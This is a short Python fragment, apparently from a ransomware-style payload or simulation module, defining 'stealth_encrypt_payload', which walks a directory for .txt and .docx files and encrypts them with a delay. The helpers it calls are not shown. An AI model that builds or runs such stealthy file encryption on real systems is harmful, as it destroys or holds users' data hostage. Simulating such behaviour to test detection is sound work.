# In payloads.py
from .behavior_patterns import (
    deep_directory_traversal,
    delay_encryption
)

def stealth_encrypt_payload(root: Path):
    targets = deep_directory_traversal(root, [".txt", ".docx"])
    delay_encryption(targets, delay=1.0)
